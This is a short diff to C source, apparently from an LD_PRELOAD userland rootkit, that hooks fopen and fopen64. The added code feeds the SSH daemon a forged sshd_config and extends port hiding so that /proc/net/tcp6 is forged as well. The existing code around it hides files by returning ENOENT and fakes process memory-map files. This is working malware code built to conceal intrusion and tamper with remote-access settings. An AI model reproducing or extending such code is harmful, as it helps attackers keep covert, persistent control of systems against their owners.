@@ -31,6 +31,11 @@ FILE *fopen(const char *pathname, const char *mode){
         return forge_procnet(pathname);
 #endif
 
+#ifdef SOFT_PATCH_SSHD_CONFIG
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+        return sshdforge(pathname);
+#endif
+
 #ifdef FORGE_MAPS
     if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
     if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
@@ -80,14 +85,20 @@ FILE *fopen64(const char *pathname, const char *mode){
         return call(CFOPEN64, pathname, mode);
 #endif
     }
+
     if(hidden_path(pathname)){
         errno = ENOENT;
         return NULL;
     }
 
 #ifdef HIDE_PORTS
-    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp"))
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
         return forge_procnet(pathname);
+#endif
+
+#ifdef SOFT_PATCH_SSHD_CONFIG
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+        return sshdforge(pathname);
 #endif
 
 #ifdef FORGE_MAPS
